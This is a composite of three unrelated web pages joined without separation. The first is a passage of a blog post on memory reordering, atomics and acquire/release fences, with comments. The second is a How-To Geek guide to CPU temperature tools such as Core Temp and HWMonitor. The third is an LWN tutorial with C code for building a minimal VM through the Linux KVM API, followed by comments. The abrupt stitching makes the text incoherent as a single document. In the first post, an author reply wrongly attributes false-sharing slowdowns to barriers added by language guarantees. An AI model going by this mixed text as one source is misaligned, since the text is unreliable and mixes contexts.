2. is_x_initialized = true The line 2 above possibly has been added by the programmer as a variable capturing if the line 1 has already been executed. The processor does not know this, nor does the compiler. The intent is in the programmer’s mind, and has not been explicitly indicated. The compiler does not understand English, and hence does not interpret the variable name to understand the intent. The memory ordering explained above will most likely  reorder the above piece of code. If that happens, the variable is_x_initialized will be set to true even before x has the value from the function. If the two variables were used only in one thread, there would be no issues because of such reordering. The impact of such optimisation becomes evident when there is another thread which is reading the value of is_x_initialized. Eg: Thread 2:
1. while(!is_x_initialized)
2.     do_something_else_and_wait_for_some_milliseconds()
3. do_something_with_x(x) Due to the optimisations explained above, the variable is_x_initialized could be set to true in Thread1 even before the value of x is set. Meanwhile Thread2 would come out of the loop, and execute do_something_with_x() with an “uninitialized” x. This is undefined behaviour. We don’t know what could have been the value of x when do_something_with_x is called. Apart from memory ordering optimisation of Thread1, there is another problem. For Thread2, the compiler can optimise as well! The compiler may optimise the code to look at is_x_initialized once, and decide not to look at it over and over again. This decision for such aggressive optimisation is justified as the loop is not modifying the value of is_x_initialized and we have not told the compiler that it can be modified by the processor or another thread. The aggressive optimisations happen when we turn on optimisations for release builds. Two outcomes are therefore possible: If is_x_initialized is true due to memory ordering of Thread1, the wait will never happen. If is_x_initialized is false, due to the compiler’s optimisation, it could never look for it again. Then the thread2 will loop indefinitely! How to solve this problem is explained later in the post. Language guarantees, compilers and processors Lets reflect upon the note above. Consider the lines of code below: 1. unsigned char counter = 0
2. char x = 'A'
3. counter = counter+1 It might just happen that counter and x are adjacent in memory. The memory layout for such a code could be: (each column represents 8 bits) counter x 0xFF 0xFF The processor loads the memory location (32 bits) as shown above into its register. The counter will get incremented by operating on the register, and then the whole 32 bits will get written back to the memory location. However, if x was updated by some other thread, it would get overwritten right? Surprise! It does not! This is because the language states that two unrelated variables should behave independent of each other. The language guarantees, and the compilers help keep sanity in a programmers life. Synchronisation through lockless programming Locks cost performance. Locks are best avoided, when performance is of prime importance. If some form of synchronisation is needed in these high performance systems, programmers prefer atomic operations. Consider the counter example. The counter can be implemented as an atomic integer. Whenever an increment happens all other threads can see the effect of this increment. The complete set of operations needed for READ, MODIFY, WRITE happen as one unit. This seems ideal. The atomics are implemented by making use of the processor instructions. No lock/unlock call is done. Hence using atomic operations one can be sure that the thread will make progress, and deadlocks cannot happen. The atomics exploit hardware instructions only as long as the atomic object is of the size of a WORD or less, i.e. the object fits in a register. All other atomic objects use locks to get the atomic behaviour. Also the memory ordering optimisations and compiler optimisations are prevented by using atomics. The atomic operations therefore prevent the problem of “is_x_initialized” being set before the actual initialisation of “x”. Simply make is_x_initialized an atomic variable to solve the above problem. Atomics are much faster than mutexes as they exploit hardware instructions. Faster than atomics Most of the modern hardware architecture support the notion of memory barriers. These memory barriers are used by C / C++ compilers to implement what are called the acquire and release semantics. These are not the same as the acquire and release of a mutex or semaphore. acquire semantics An acquire operation guarantees that the effect of that operation in a thread is seen by other processors before any subsequent operations in that thread. This means none of the subsequent operations in that thread will be optimised to be executed before the acquire operation. This is sometimes referred as “load acquire”. release semantics A release operation guarantees that the effects of all the operations prior the release operation are seen by other processors before the release operation. This means that memory ordering will not delay the effect of a prior operation beyond the release operation. This is sometimes referred as “store release”. acquired_and_release semantics This is a very strong fence. In this form, none of the operations before the acquire_and_release operation can be delayed beyond the acquire_and_release. Also none of the operations after the acquire_and_release operation can be ordered before this operation. consume semantics The consume is a weaker form of acquire, in which some of the subsequent operations can be performed before this operation. The operations which are inconsequential with regards to consume can be optimised to be performed before the consume! Using hardware instructions, these semantics are implemented by the compiler. They are known as barriers or fences. Atomics are implemented using the barriers. Needless to say, if these are exploited, a programmer can get performance better than using atomic variables. In a subsequent post, I will attempt to explain using these techniques for producer / consumer queues. Conclusion Under usual circumstances of application development, the techniques which exploit hardware instructions are rarely needed. For one or two modules in a huge system which demands very high performance do we ever need to exploit hardware instructions. In most cases of high performance systems, ensure that cache misses and acquiring locks is avoided. This yields satisfactory performance. The purpose of this article was to try to elaborate SMP, multithreading and advanced synchronisation techniques. Writing high performance software is a very huge subject, which is not covered by this post. I hope this post was as enjoyable, and informative enough to create interest and curiosity in exploring the techniques further. Like this: Like Loading...

I’ll try and implement something that I have learned from this post in my next project.🙂 Reply alokashtikar says: October 21, 2016 at 3:22 am Thanks Sarthak! There is a follow up post I have planned for this one, in which we will discuss the lockless circular buffers. Reply codeborgs says: October 24, 2016 at 7:58 am Thanks! Great stuff. One question if I may. > However, if x was updated by some other thread, it would get overwritten right? Surprise! It does not! This is because the language states that two unrelated variables should behave independent of each other. Any more info on how is this guaranteed by the compiler? Thx Reply alokashtikar says: October 24, 2016 at 11:22 am Thanks codeborgs! I had avoided discussing any particular language in the post, so that SMP can be discussed as a concept (technique). To discuss about compilers, we need to associate with a language. For further discussing this, we can look at C++. The C++ language specifies what is called a memory model. The memory model defines aspects such as what is smallest unit of memory that can be referred by a program. In case of C++ it happens to be a byte. It also defines rules like the one you are referring. There is a lot more to it, which can be seen in the ISO standard for C++. It is technically up to the compilers what they use to enforce the rule. A good compiler in this case would use memory barriers. Discussing the memory barriers and the memory model for any language is a very big subject, and a blog post is not enough for it. However, for an application developer, it is reasonable to expect that enforcing the memory model on any architecture would be done in the most efficient way possible, by a compiler. It would be better to not take matters into ones hands and try to optimise it further.🙂 Reply alokashtikar says: October 24, 2016 at 11:25 am isocpp.org Reply Mandeep says: October 31, 2016 at 3:56 am Nice post. The specific good thing is it explains how things are working internally in a simple way. Few things: a. You mentioned that how improper use of language facilities for threading can lead to worst performance. It would be nice to elaborate this or give some examples and will help programmers avoid mistakes. Though I would say it can be an article in itself. b. There may be other multithreading issues that can be covered as well? E.g. I heard is say we have a struct {int I; int j;} and 2 different threads Th1 & Th2 modify it. Th1 does I++ & Th2 does j++. each thread takes ‘t’ time. For multithreaded system total time shud be ‘t’ but it ends up to be 2t or even more. This can happen because whole struct gets inlined in a single cache and one thread when updates ‘i’ will invalidate the whole cache. I guess this would related to “Language guarantee” section but leads to lower performance? How to avoid such situation? More such issues if added to the article can be helpful. Reply alokashtikar says: November 2, 2016 at 4:15 am Thanks Mandeep! Yes in case of 64 bit builds the case you mentioned apply. And in that the language guarantees will push in barriers causing the slowness / degradation in performance. Regarding improper use of language features, some examples could be over use of locks, using semaphores where locks could be used. In case of C++ over use of shared_ptr. One more common mistake is using a central object / cache and locking it during the complete operation (function / across functions). Sometimes use of improper data structures also cause slowness, like using linked lists or tree data structures, where vectors and heaps can be used. These are some of the examples.

RSS ALL ARTICLES FEATURES ONLY   TRIVIA Search How-To Geek How to Monitor Your Computer’s CPU Temperature There are two groups of users worried about the temperature of their computer: overclockers… and pretty much anybody with a powerful laptop. Those things just cook you! So have you ever wondered exactly what temperature your CPU is running at? There are quite a few Windows programs that you can use to monitor the temperature. Here are two of our favorite options. For Basic CPU Temperature Monitoring: Core Temp The most important temperature to measure in your computer is the processor, or CPU. Core Temp is a simple, lightweight app that runs in your system tray and monitor’s the temperature of your CPU without cluttering it up with other stuff. It offers a few different options so you can customize it to your tastes, and even works with other programs like Rainmeter. Download Core Temp from its home page and install it on your computer. Be very careful to uncheck the bundled software on the third page of the installation! This was unchecked by default for me, but other users have noted that it is checked by default for them. When you run it, it will appear as an icon or series of icons in your system tray showing the temperature of your CPU. If your CPU has multiple cores (as most modern CPUs do), it will show multiple icons–one for each core. Right-click on the icon to show or hide the main window. It will give you a bunch of information about your CPU, including the model, speed, and the temperature of each of its cores. Take particular note of the “TJ. Max” value–this is the highest temperature (in Celsius) at which the manufacturer has rated your CPU to run. If your CPU is anywhere near that temperature, it is considered overheating. (Usually it’s best to keep it at least 10 to 20 degrees lower than that–and even then, if you’re anywhere close, it usually means something is wrong unless you’ve overclocked your CPU.) For most modern CPUs, Core Temp should be able to detect the Tj. Max for your specific processor, but you should look your specific processor online and double check. Every processor is a little different, and having an accurate Tj. Max value is very important, as it ensures you’re getting the correct temperature readings for your CPU. Head to Options > Settings to configure some of Core Temp’s more useful features. Here are a few settings we recommend looking at: General > Start Core Temp with Windows: You can turn this on or off; it’s up to you. Turning it on will allow you to monitor your temperatures at all time without having to remember to start it up. But if you only need the app occasionally, it’s okay to turn this off. Display > Start Core Temp minimized: You’ll probably want to turn this on if you have “Start Core Temp with Windows” on. Display > Hide Taskbar Button: Again, if you’re going to leave it running all the time, this is good to turn on so it doesn’t waste space on your taskbar. Notification Area > Notification Area Icons: This allows you to customize how Core Temp appears in your notification area (or system tray, as its commonly called). You can choose to display just the app’s icon, or display the temperature of your CPU–I recommend the “highest temperature” (instead of “all cores”, which will show multiple icons). You can also customize the font and colors here. If the icon is only appearing in the pop-up tray and you want to see it at all times, just click and drag it onto your taskbar. If you decide to show the temperature in the notification area, you may want to change the Temperature Polling Interval in the General tab of Core Temp’s settings. By default, it’s set to 1000 milliseconds, but you can move it higher if the blinking numbers annoy you. Just remember the higher you set it, the more time it’ll take for Core Temp to notify you if your CPU is running hot. Core Temp can do a lot more than this–you can head to Options > Overheat Protection to have your computer alert you when it reaches its maximum safe temperature, for example–but these basics should be all you need to keep an eye on your CPU temperatures. For Advanced Monitoring Across Your Entire System: HWMonitor Generally, your CPU temperatures are going to be the most important temperatures to monitor. But, if you want to see temperatures across your system–motherboard, CPU, graphics card, and hard drives–HWMonitor gives you that and much more. Download the latest version from the HWMonitor home page–I recommend the ZIP version, which doesn’t require installation, though you can also download the full setup version if you want. Start it up, and you’ll be greeted with a table of temperatures, fan speeds, and other values. To find your CPU temperature, scroll down to the entry for your CPU–mine, for example, is an “Intel Core i7 4930K”–and look at the “Core #” temperatures in the list. (Note that “Core Temperature” is different than “CPU Temp”, which will appear under the motherboard section for some PCs. Generally, you’ll want to monitor the Core temperature. See our note below about AMD temperatures for more info.) Feel free to poke around and see temperatures for other components in your system, too. There isn’t much else you can do with HWMonitor, but it’s a good program to have around. A Note on AMD Processor Temperatures Monitoring temperatures for AMD processors has long puzzled computer enthusiasts. Unlike most Intel processors, AMD machines will report two temperatures: “CPU Temperature” and “Core Temperature”. “CPU Temperature” is an actual temperature sensor inside the CPU’s socket. “Core Temperature”, on the other hand, isn’t really a temperature at all. It’s an arbitrary scale measured in degrees celsius designed to, in a way, mimic a temperature sensor. Your BIOS will often show the CPU Temperature, which may differ from programs like Core Temp, which show Core Temperature. Some programs, like HWMonitor, show both. CPU Temperature is more accurate at low levels, but less so at high levels. Core Temperature is more accurate and precise when your CPU get hot–which is when temperature values really matter. So, in almost all cases, you’ll want to pay attention to Core Temperature. When your system is idle, it may show impossibly low temperatures (like 15 degrees celsius), but once things heat up a bit, it will show a more accurate–and useful–value. What to Do If You Don’t Get a Reading (or Temperatures Look Really Wrong) In some cases, you may find that one of the above programs doesn’t quite work. Maybe it doesn’t match up with another temperature-monitoring program, maybe it’s absurdly low, or maybe you can’t get a temperature at all. There are a lot of reasons this could happen, but here are a few things to check: Are you looking at the right sensors? If two programs don’t agree, it’s possible–especially on AMD machines–that one program is reporting the “Core temperature” and one is reporting the “CPU temperature”. Make sure you’re comparing apples to apples. Core temperature is usually what you want to monitor, as we mentioned above. Make sure your programs are up to date. If you’re using an old version of Core Temp, for example, it may not support your CPU, in which case it won’t provide an accurate temperature (or possibly won’t even provide a temperature at all). Download the latest version to see if it fixes the problem. If you have a very new CPU, you may need to wait for an update to the program. How old is your computer? If it’s more than a few years old, it may not be supported by programs like Core Temp. We could write a book about monitoring CPU temperatures, but in the interest of keeping this easy to follow, we’ll leave it at that. Hopefully, you can get a general estimate of how well your CPU is being cooled. Monitoring your temperatures is good, and something everyone should check on once in a while. But if your computer is regularly overheating, there’s probably a deeper cause that you need to look into. Open up the Task Manager and see if there are any processes using your CPU, and stop them (or figure out why they’re out of control). Make sure that you aren’t blocking any of the vents on your computer, especially if it’s a laptop. Blow the vents out with compressed air to make sure they aren’t filled with dust and dirt. The older and dirtier a computer gets, the harder the fans have to work to keep the temperature down–which means a hot computer and very loud fans.

The installer for CoreTemp is very sneaky; it includes a default-ON selection for a game (something about building an empire) and it obscures the radio button between others. Look carefully - don't just click in a hurry. So I got it installed and ran it. Looked OK until I noticed three of my cores had a max of about 40ºC and the fourth had 73º as a max. Now I have been running Piniform Speccy for some time and have never before seen such an anomaly on this normally very well behaved HP Envy with I7-4770. So I tried to start Speccy to double check; this was early morning and I hadn't run anything that is at all processor intensive. But Speccy wouldn't load. OK, so now I'm getting a bit scared. Killed CoreTemp and uninstalled it; Speccy still wouldn't start. So I restarted (Windows 10 1607) and it hung on the word "restarting" for 3 minutes. Pressed power button and forced shutdown. Restarted and all is normal again, scanned with MalWareBytes and all is clean. Speccy runs and all cores are high 30sºC. Tried HWMonitor64 from the Zip; it's ok - I'll keep it around. My advice: avoid CoreTemp (YMMV). HWMonitor is OK so far, but I'm keeping Speccy too. October 23, 2016 Ashley Smith Same here. It Tried to sneak in crapware.

October 24, 2016 Whitson Gordon Thanks for the note on Core Temp--I knew it had crapware in it, but for some reason when I installed it it was unchecked by default. I'll make a big clear note in the post to avoid it! If I had my way, I'd avoid recommending any program that tries to bundle extra software, but sadly, with the current state of Windows software, that just isn't possible--you'd miss out on too many otherwise very useful programs. Core Temp is the best of its kind when it comes to monitoring temperatures. It also seems a little unfair to blame your Speccy problems on Core Temp when a hard restart fixed the problem. Plenty of users (myself included) run Speccy and Core Temp in harmony with no problem. You don't really have enough information here to say what caused Speccy to be weird. At any rate, thanks again for letting us know about the crapware. Post updated! October 24, 2016 Whitson Gordon This article has been updated, not recycled. The URL remains the same.

If you appreciate our content, please buy a subscription and make the next set of articles possible. September 29, 2015 This article was contributed by Josh Triplett Many developers, users, and entire industries rely on virtualization, as provided by software like Xen, QEMU/KVM, or kvmtool. While QEMU can run a software-based virtual machine, and Xen can run cooperating paravirtualized OSes without hardware support, most current uses and deployments of virtualization rely on hardware-accelerated virtualization, as provided on many modern hardware platforms. Linux supports hardware virtualization via the Kernel Virtual Machine (KVM) API. In this article, we'll take a closer look at the KVM API, using it to directly set up a virtual machine without using any existing virtual machine implementation. A virtual machine using KVM need not run a complete operating system or emulate a full suite of hardware devices. Using the KVM API, a program can run code inside a sandbox and provide arbitrary virtual hardware interfaces to that sandbox. If you want to emulate anything other than standard hardware, or run anything other than a standard operating system, you'll need to work with the KVM API used by virtual machine implementations. As a demonstration that KVM can run more (or less) than just a complete operating system, we'll instead run a small handful of instructions that simply compute 2+2 and print the result to an emulated serial port. The KVM API provides an abstraction over the hardware-virtualization features of various platforms. However, any software making use of the KVM API still needs to handle certain machine-specific details, such as processor registers and expected hardware devices. For the purposes of this article, we'll set up an x86 virtual machine using Intel VT. For another platform, you'd need to handle different registers, different virtual hardware, and different expectations about memory layout and initial state. The Linux kernel includes documentation of the KVM API in Documentation/virtual/kvm/api.txt and other files in the Documentation/virtual/kvm/ directory. This article includes snippets of sample code from a fully functional sample program (MIT licensed). The program makes extensive use of the err() and errx() functions for error handling; however, the snippets quoted in the article only include non-trivial error handling. Definition of the sample virtual machine A full virtual machine using KVM typically emulates a variety of virtual hardware devices and firmware functionality, as well as a potentially complex initial state and initial memory contents. For our sample virtual machine, we'll run the following 16-bit x86 code: 
    mov $0x3f8, %dx
    add %bl, %al
    add $'0', %al
    out %al, (%dx)
    mov $'\n', %al
    out %al, (%dx)
    hlt
 These instructions will add the initial contents of the al and bl registers (which we will pre-initialize to 2), convert the resulting sum (4) to ASCII by adding '0', output it to a serial port at 0x3f8 followed by a newline, and then halt. Rather than reading code from an object file or executable, we'll pre-assemble these instructions (via gcc and objdump) into machine code stored in a static array: 
    const uint8_t code[] = {
	0xba, 0xf8, 0x03, /* mov $0x3f8, %dx */
	0x00, 0xd8,       /* add %bl, %al */
	0x04, '0',        /* add $'0', %al */
	0xee,             /* out %al, (%dx) */
	0xb0, '\n',       /* mov $'\n', %al */
	0xee,             /* out %al, (%dx) */
	0xf4,             /* hlt */
    };
 For our initial state, we will preload this code into the second page of guest "physical" memory (to avoid conflicting with a non-existent real-mode interrupt descriptor table at address 0). al and bl will contain 2, the code segment (cs) will have a base of 0, and the instruction pointer (ip) will point to the start of the second page at 0x1000. Rather than the extensive set of virtual hardware typically provided by a virtual machine, we'll emulate only a trivial serial port on port 0x3f8. Finally, note that running 16-bit real-mode code with hardware VT support requires a processor with "unrestricted guest" support. The original VT implementations only supported protected mode with paging enabled; emulators like QEMU thus had to handle virtualization in software until reaching a paged protected mode (typically after OS boot), then feed the virtual system state into KVM to start doing hardware emulation. However, processors from the "Westmere" generation and newer support "unrestricted guest" mode, which adds hardware support for emulating 16-bit real mode, "big real mode", and protected mode without paging. The Linux KVM subsystem has supported the "unrestricted guest" feature since Linux 2.6.32 in June 2009. Building a virtual machine First, we'll need to open /dev/kvm: 
    kvm = open("/dev/kvm", O_RDWR | O_CLOEXEC);
 We need read-write access to the device to set up a virtual machine, and all opens not explicitly intended for inheritance across exec should use O_CLOEXEC. Depending on your system, you likely have access to /dev/kvm either via a group named "kvm" or via an access control list (ACL) granting access to users logged in at the console. Before you use the KVM API, you should make sure you have a version you can work with. Early versions of KVM had an unstable API with an increasing version number, but the KVM_API_VERSION last changed to 12 with Linux 2.6.22 in April 2007, and got locked to that as a stable interface in 2.6.24; since then, KVM API changes occur only via backward-compatible extensions (like all other kernel APIs). So, your application should first confirm that it has version 12, via the KVM_GET_API_VERSION ioctl(): 
    ret = ioctl(kvm, KVM_GET_API_VERSION, NULL);
    if (ret == -1)
	err(1, "KVM_GET_API_VERSION");
    if (ret != 12)
	errx(1, "KVM_GET_API_VERSION %d, expected 12", ret);
 After checking the version, you may want to check for any extensions you use, using the KVM_CHECK_EXTENSION ioctl(). However, for extensions that add new ioctl() calls, you can generally just call the ioctl(), which will fail with an error (ENOTTY) if it does not exist. If we wanted to check for the one extension we use in this sample program, KVM_CAP_USER_MEM (required to set up guest memory via the KVM_SET_USER_MEMORY_REGION ioctl()), that check would look like this: 
    ret = ioctl(kvm, KVM_CHECK_EXTENSION, KVM_CAP_USER_MEMORY);
    if (ret == -1)
	err(1, "KVM_CHECK_EXTENSION");
    if (!ret)
	errx(1, "Required extension KVM_CAP_USER_MEM not available");
 Next, we need to create a virtual machine (VM), which represents everything associated with one emulated system, including memory and one or more CPUs. KVM gives us a handle to this VM in the form of a file descriptor: 
    vmfd = ioctl(kvm, KVM_CREATE_VM, (unsigned long)0);
 The VM will need some memory, which we provide in pages. This corresponds to the "physical" address space as seen by the VM. For performance, we wouldn't want to trap every memory access and emulate it by returning the corresponding data; instead, when a virtual CPU attempts to access memory, the hardware virtualization for that CPU will first try to satisfy that access via the memory pages we've configured. If that fails (due to the VM accessing a "physical" address without memory mapped to it), the kernel will then let the user of the KVM API handle the access, such as by emulating a memory-mapped I/O device or generating a fault. For our simple example, we'll allocate a single page of memory to hold our code, using mmap() directly to obtain page-aligned zero-initialized memory: 
    mem = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
 We then need to copy our machine code into it: 
    memcpy(mem, code, sizeof(code));
 And finally tell the KVM virtual machine about its spacious new 4096-byte memory: 
    struct kvm_userspace_memory_region region = {
	.slot = 0,
	.guest_phys_addr = 0x1000,
	.memory_size = 0x1000,
	.userspace_addr = (uint64_t)mem,
    };
    ioctl(vmfd, KVM_SET_USER_MEMORY_REGION, &region);
 The slot field provides an integer index identifying each region of memory we hand to KVM; calling KVM_SET_USER_MEMORY_REGION again with the same slot will replace this mapping, while calling it with a new slot will create a separate mapping. guest_phys_addr specifies the base "physical" address as seen from the guest, and userspace_addr points to the backing memory in our process that we allocated with mmap(); note that these always use 64-bit values, even on 32-bit platforms. memory_size specifies how much memory to map: one page, 0x1000 bytes. Now that we have a VM, with memory containing code to run, we need to create a virtual CPU to run that code. A KVM virtual CPU represents the state of one emulated CPU, including processor registers and other execution state. Again, KVM gives us a handle to this VCPU in the form of a file descriptor: 
    vcpufd = ioctl(vmfd, KVM_CREATE_VCPU, (unsigned long)0);
 The 0 here represents a sequential virtual CPU index. A VM with multiple CPUs would assign a series of small identifiers here, from 0 to a system-specific limit (obtainable by checking the KVM_CAP_MAX_VCPUS capability with KVM_CHECK_EXTENSION). Each virtual CPU has an associated struct kvm_run data structure, used to communicate information about the CPU between the kernel and user space. In particular, whenever hardware virtualization stops (called a "vmexit"), such as to emulate some virtual hardware, the kvm_run structure will contain information about why it stopped. We map this structure into user space using mmap(), but first, we need to know how much memory to map, which KVM tells us with the KVM_GET_VCPU_MMAP_SIZE ioctl(): 
    mmap_size = ioctl(kvm, KVM_GET_VCPU_MMAP_SIZE, NULL);
 Note that the mmap size typically exceeds that of the kvm_run structure, as the kernel will also use that space to store other transient structures that kvm_run may point to. Now that we have the size, we can mmap() the kvm_run structure: 
    run = mmap(NULL, mmap_size, PROT_READ | PROT_WRITE, MAP_SHARED, vcpufd, 0);
 The VCPU also includes the processor's register state, broken into two sets of registers: standard registers and "special" registers. These correspond to two architecture-specific data structures: struct kvm_regs and struct kvm_sregs, respectively. On x86, the standard registers include general-purpose registers, as well as the instruction pointer and flags; the "special" registers primarily include segment registers and control registers. Before we can run code, we need to set up the initial states of these sets of registers. Of the "special" registers, we only need to change the code segment (cs); its default state (along with the initial instruction pointer) points to the reset vector at 16 bytes below the top of memory, but we want cs to point to 0 instead. Each segment in kvm_sregs includes a full segment descriptor; we don't need to change the various flags or the limit, but we zero the base and selector fields which together determine what address in memory the segment points to. To avoid changing any of the other initial "special" register states, we read them out, change cs, and write them back: 
    ioctl(vcpufd, KVM_GET_SREGS, &sregs);
    sregs.cs.base = 0;
    sregs.cs.selector = 0;
    ioctl(vcpufd, KVM_SET_SREGS, &sregs);
 For the standard registers, we set most of them to 0, other than our initial instruction pointer (pointing to our code at 0x1000, relative to cs at 0), our addends (2 and 2), and the initial state of the flags (specified as 0x2 by the x86 architecture; starting the VM will fail with this not set): 
    struct kvm_regs regs = {
	.rip = 0x1000,
	.rax = 2,
	.rbx = 2,
	.rflags = 0x2,
    };
    ioctl(vcpufd, KVM_SET_REGS, &regs);
 With our VM and VCPU created, our memory mapped and initialized, and our initial register states set, we can now start running instructions with the VCPU, using the KVM_RUN ioctl(). That will return successfully each time virtualization stops, such as for us to emulate hardware, so we'll run it in a loop: 
    while (1) {
	ioctl(vcpufd, KVM_RUN, NULL);
	switch (run->exit_reason) {
	/* Handle exit */
	}
    }
 Note that KVM_RUN runs the VM in the context of the current thread and doesn't return until emulation stops. To run a multi-CPU VM, the user-space process must spawn multiple threads, and call KVM_RUN for different virtual CPUs in different threads. To handle the exit, we check run->exit_reason to see why we exited. This can contain any of several dozen exit reasons, which correspond to different branches of the union in kvm_run. For this simple VM, we'll just handle a few of them, and treat any other exit_reason as an error. We treat a hlt instruction as a sign that we're done, since we have nothing to ever wake us back up: 
	case KVM_EXIT_HLT:
	    puts("KVM_EXIT_HLT");
	    return 0;
 To let the virtualized code output its result, we emulate a serial port on I/O port 0x3f8. Fields in run->io indicate the direction (input or output), the size (1, 2, or 4), the port, and the number of values. To pass the actual data, the kernel uses a buffer mapped after the kvm_run structure, and run->io.data_offset provides the offset from the start of that mapping. 
	case KVM_EXIT_IO:
	    if (run->io.direction == KVM_EXIT_IO_OUT &&
		    run->io.size == 1 &&
		    run->io.port == 0x3f8 &&
		    run->io.count == 1)
		putchar(*(((char *)run) + run->io.data_offset));
	    else
		errx(1, "unhandled KVM_EXIT_IO");
	    break;
 To make it easier to debug the process of setting up and running the VM, we handle a few common kinds of errors. KVM_EXIT_FAIL_ENTRY, in particular, shows up often when changing the initial conditions of the VM; it indicates that the underlying hardware virtualization mechanism (VT in this case) can't start the VM because the initial conditions don't match its requirements. (Among other reasons, this error will occur if the flags register does not have bit 0x2 set, or if the initial values of the segment or task-switching registers fail various setup criteria.) The hardware_entry_failure_reason does not actually distinguish many of those cases, so an error of this type typically requires a careful read through the hardware documentation. 
	case KVM_EXIT_FAIL_ENTRY:
	    errx(1, "KVM_EXIT_FAIL_ENTRY: hardware_entry_failure_reason = 0x%llx",
		 (unsigned long long)run->fail_entry.hardware_entry_failure_reason);
 KVM_EXIT_INTERNAL_ERROR indicates an error from the Linux KVM subsystem rather than from the hardware. In particular, under various circumstances, the KVM subsystem will emulate one or more instructions in the kernel rather than via hardware, such as for performance reasons (to coalesce a series of vmexits for I/O). The run->internal.suberror value KVM_INTERNAL_ERROR_EMULATION indicates that the VM encountered an instruction it doesn't know how to emulate, which most commonly indicates an invalid instruction. 
	case KVM_EXIT_INTERNAL_ERROR:
	    errx(1, "KVM_EXIT_INTERNAL_ERROR: suberror = 0x%x",
	         run->internal.suberror);
 When we put all of this together into the sample code, build it, and run it, we get the following: 
    $ ./kvmtest
    4
    KVM_EXIT_HLT
 Success! We ran our machine code, which added 2+2, turned it into an ASCII 4, and wrote it to port 0x3f8. This caused the KVM_RUN ioctl() to stop with KVM_EXIT_IO, which we emulated by printing the 4. We then looped and re-entered KVM_RUN, which stops with KVM_EXIT_IO again for the \n. On the third and final loop, KVM_RUN stops with KVM_EXIT_HLT, so we print a message and quit. Additional KVM API features This sample virtual machine demonstrates the core of the KVM API, but ignores several other major areas that many non-trivial virtual machines will care about. Prospective implementers of memory-mapped I/O devices will want to look at the exit_reason KVM_EXIT_MMIO, as well as the KVM_CAP_COALESCED_MMIO extension to reduce vmexits, and the ioeventfd mechanism to process I/O asynchronously without a vmexit. For hardware interrupts, see the irqfd mechanism, using the KVM_CAP_IRQFD extension capability. This provides a file descriptor that can inject a hardware interrupt into the KVM virtual machine without stopping it first. A virtual machine may thus write to this from a separate event loop or device-handling thread, and threads running KVM_RUN for a virtual CPU will process that interrupt at the next available opportunity. x86 virtual machines will likely want to support CPUID and model-specific registers (MSRs), both of which have architecture-specific ioctl()s that minimize vmexits. Applications of the KVM API Other than learning, debugging a virtual machine implementation, or as a party trick, why use /dev/kvm directly? Virtual machines like qemu-kvm or kvmtool typically emulate the standard hardware of the target architecture; for instance, a standard x86 PC. While they can support other devices and virtio hardware, if you want to emulate a completely different type of system that shares little more than the instruction set architecture, you might want to implement a new VM instead. And even within an existing virtual machine implementation, authors of a new class of virtio hardware device will want a clear understanding of the KVM API. Efforts like novm and kvmtool use the KVM API to construct a lightweight VM, dedicated to running Linux rather than an arbitrary OS. More recently, the Clear Containers project uses kvmtool to run containers using hardware virtualization. Alternatively, a VM need not run an OS at all. A KVM-based VM could instead implement a hardware-assisted sandbox with no virtual hardware devices and no OS, providing arbitrary virtual "hardware" devices as the API between the sandbox and the sandboxing VM. While running a full virtual machine remains the primary use case for hardware virtualization, we've seen many innovative uses of the KVM API recently, and we can certainly expect more in the future. (Log in to post comments) Using the KVM API Posted Sep 29, 2015 18:30 UTC (Tue) by flewellyn (subscriber, #5047) [Link] Interesting and powerful tool, this KVM. The kernel API looks pretty low-level. I can see why something like libvirt would be needed to abstract it a bit. Using the KVM API Posted Sep 29, 2015 18:38 UTC (Tue) by luto (subscriber, #39314) [Link] Libvirt isn't really abstracting KVM -- it's abstracting QEMU, which uses KVM to implement something that looks like a real computer. Using the KVM API Posted Sep 29, 2015 18:45 UTC (Tue) by josh (subscriber, #17465) [Link] Right. Much of libvirt's configuration has to do with disk images, memory, network, and many other peripherals that depend on the VM implementation like qemu-kvm. Using the KVM API Posted Sep 29, 2015 19:15 UTC (Tue) by eru (subscriber, #2753) [Link] Wonder if it would be too much work to make dosemu use kvm? Originally dosemu was written to take advantage of the VM86 mode of 386, but this is not available on the x86_68 in 64-bit mode, so dosemu currently runs quite slowly there, because it falls back to software emulation. Using the KVM API Posted Sep 29, 2015 19:40 UTC (Tue) by josh (subscriber, #17465) [Link] Both dosemu and dosbox should be able to use the KVM API, as long as the system has "unrestricted guest" mode available to run real-mode code. Using the KVM API Posted Sep 29, 2015 21:18 UTC (Tue) by pbonzini (subscriber, #60935) [Link] Note that KVM used QEMU to handle the boot phase only in the very beginning; nowadays it uses vm86 mode or an in-kernel interpreter if unrestricted guest mode is unavailable. This avoids duplicating the emulation code between the kernel and userspace. Userspace doesn't know if you're running on a >=Westmere processor (or AMD, which has always had the equivalent of unrestricted mode--they called it "paged real mode"), or if you need to work around the limitations of the processor. But KVM is not really needed in this case: on one hand you don't need near bare-metal performance that KVM provides, because dosemu/dosbox only need to emulate a 100 MHz machine or so, and a simple interpreter or a JIT compiler like QEMU's can handle it (QEMU is known as slowish for a JIT translator, but there's some work being done on that side as well). On the other hand KVM's performance comes with some fine print, which you cannot really afford in the case of dosemu/dosbox. A KVM_EXIT_IO exit is very slow, on the order of a few thousand cycles on the newest processors. By comparison, QEMU can dispatch a single memory-mapped I/O operation in about 100 clock cycles, so 60-150 times faster than KVM. Hence running demos like Unreal (https://www.youtube.com/watch?v=VjYQeMExIwk#t=7m) doesn't work too well on QEMU with KVM because they do an insane number of such exits. To play old games (man, I should send those Jazz Jackrabbit patches upstream...) I typically use QEMU without KVM.

I have some interest in compiling out most or all of the in-kernel instruction emulation, to reduce attack surface area. > A KVM_EXIT_IO exit is very slow, on the order of a few thousand cycles on the newest processors.

With unrestricted_guest=1 you only exit to the emulator for a few privileged instructions (where for simplicity KVM emulates them instead of having a mini-interpreter in vmx.c/svm.c) and for I/O. But unfortunately, thanks to the x86 ISA's read-modify-write instructions that's still a _lot_ of different instructions that you can emulate. So there's not much that you can compile out. You could simply modify KVM to refuse loading if unrestricted_guest=0, but you can still trigger any bit of emulator code by setting up a race between two VCPUs. One triggers I/O continuously, the other races against the emulator changing the opcodes of the I/O instruction into something else. This actually used to be a vulnerability, but it's been patched for several years and the emulator is now considered a security sensitive component. > > A KVM_EXIT_IO exit is very slow, on the order of a few thousand cycles on the > > newest processors.

